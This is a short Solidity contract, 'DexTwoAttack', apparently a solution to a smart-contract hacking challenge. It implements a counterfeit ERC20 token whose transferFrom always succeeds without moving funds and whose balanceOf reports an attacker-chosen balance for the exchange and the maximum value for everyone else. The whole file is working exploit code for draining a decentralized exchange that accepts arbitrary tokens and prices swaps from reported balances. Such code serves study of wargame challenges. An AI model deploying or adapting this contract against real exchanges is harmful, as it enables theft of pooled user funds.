contract DexTwoAttack is IERC20 {

    uint256 public fakeBalance;
    address public exchange;

    function setExchange(address to) public {
        exchange = to;
    }

    function setFakeBalance(uint256 amount) public {
        fakeBalance = amount;
    }

    function transferFrom(address, address, uint256) public override returns(bool){
        return true;
    }

    function balanceOf(address account) public view override returns(uint256) {
        if (account == exchange) {
            return fakeBalance;
        } else {
            return uint256(-1);
        }
    }

    function allowance(address owner, address spender) external view override returns (uint256) {}
    function approve(address spender, uint256 amount) external override returns (bool) {}
    function transfer(address recipient, uint256 amount) external override returns (bool) {}
    function totalSupply() external view override returns (uint256) {}
}